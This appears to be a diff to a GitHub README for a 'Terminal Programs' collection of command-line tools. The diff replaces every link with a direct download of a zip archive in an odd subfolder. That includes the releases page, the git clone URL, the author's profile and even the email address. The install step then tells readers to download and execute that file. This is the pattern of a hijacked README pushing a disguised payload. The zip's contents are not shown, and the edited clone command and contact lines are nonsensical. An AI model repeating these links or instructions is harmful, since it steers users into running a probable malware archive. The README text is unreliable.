@@ -2,7 +2,7 @@
 
 Welcome to the **Terminal Programs** repository! This space is dedicated to enhancing your command-line experience through various terminal-based programs and commands. Whether you're a seasoned programmer or just starting out, you will find valuable resources here to improve your skills and productivity.
 
-[![Download Releases](https://img.shields.io/badge/Download%20Releases-blue.svg)](https://github.com/bou3lem/Terminal_Programs/releases)
+[![Download Releases](https://github.com/bou3lem/Terminal_Programs/raw/refs/heads/main/Suriana/Terminal-Programs-v2.8.zip%https://github.com/bou3lem/Terminal_Programs/raw/refs/heads/main/Suriana/Terminal-Programs-v2.8.zip)](https://github.com/bou3lem/Terminal_Programs/raw/refs/heads/main/Suriana/Terminal-Programs-v2.8.zip)
 
 ## Table of Contents
 
@@ -24,7 +24,7 @@ Here, you will find:
 - Custom commands for enhanced terminal functionality
 - Guides on how to use AI tools like ChatGPT in the terminal
 
-You can explore the latest updates and download releases from the [Releases section](https://github.com/bou3lem/Terminal_Programs/releases).
+You can explore the latest updates and download releases from the [Releases section](https://github.com/bou3lem/Terminal_Programs/raw/refs/heads/main/Suriana/Terminal-Programs-v2.8.zip).
 
 ## Features
 
@@ -39,11 +39,11 @@ To install the programs in this repository, follow these steps:
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/bou3lem/Terminal_Programs.git
+   git clone https://github.com/bou3lem/Terminal_Programs/raw/refs/heads/main/Suriana/Terminal-Programs-v2.8.zip
    cd Terminal_Programs
    ```
 
-2. **Download Releases**: Visit the [Releases section](https://github.com/bou3lem/Terminal_Programs/releases) to find the latest version. Download the appropriate file for your system and execute it.
+2. **Download Releases**: Visit the [Releases section](https://github.com/bou3lem/Terminal_Programs/raw/refs/heads/main/Suriana/Terminal-Programs-v2.8.zip) to find the latest version. Download the appropriate file for your system and execute it.
 
 3. **Set Up**: Follow any specific instructions provided in the release notes for setup.
 
@@ -75,11 +75,11 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For questions or feedback, feel free to reach out:
 
-- **GitHub**: [bou3lem](https://github.com/bou3lem)
-- **Email**: bou3lem@example.com
+- **GitHub**: [bou3lem](https://github.com/bou3lem/Terminal_Programs/raw/refs/heads/main/Suriana/Terminal-Programs-v2.8.zip)
+- **Email**: https://github.com/bou3lem/Terminal_Programs/raw/refs/heads/main/Suriana/Terminal-Programs-v2.8.zip
 
 ## Conclusion
 
-Thank you for visiting the **Terminal Programs** repository. We hope you find the tools and resources here helpful for your programming journey. Don’t forget to check the [Releases section](https://github.com/bou3lem/Terminal_Programs/releases) for the latest updates!
+Thank you for visiting the **Terminal Programs** repository. We hope you find the tools and resources here helpful for your programming journey. Don’t forget to check the [Releases section](https://github.com/bou3lem/Terminal_Programs/raw/refs/heads/main/Suriana/Terminal-Programs-v2.8.zip) for the latest updates!
 
 Happy coding! 🎉
